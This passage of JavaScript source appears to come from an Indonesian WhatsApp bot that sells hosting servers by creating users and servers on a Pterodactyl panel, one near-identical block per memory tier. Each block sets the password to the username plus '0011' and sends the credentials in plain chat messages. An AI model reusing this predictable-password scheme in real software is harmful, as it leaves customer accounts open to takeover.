"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "19gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "19GB"
let egg = global.eggsnya
let loc = global.location
let memo = "19240"
let cpu = "500"
let disk = "19240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "18gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "18GB"
let egg = global.eggsnya
let loc = global.location
let memo = "18240"
let cpu = "480"
let disk = "18240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "17gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "17GB"
let egg = global.eggsnya
let loc = global.location
let memo = "17240"
let cpu = "450"
let disk = "17240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "15gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "15GB"
let egg = global.eggsnya
let loc = global.location
let memo = "15240"
let cpu = "420"
let disk = "15240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "16gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "16GB"
let egg = global.eggsnya
let loc = global.location
let memo = "16240"
let cpu = "410"
let disk = "16240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "14gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "14GB"
let egg = global.eggsnya
let loc = global.location
let memo = "14240"
let cpu = "360"
let disk = "14240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
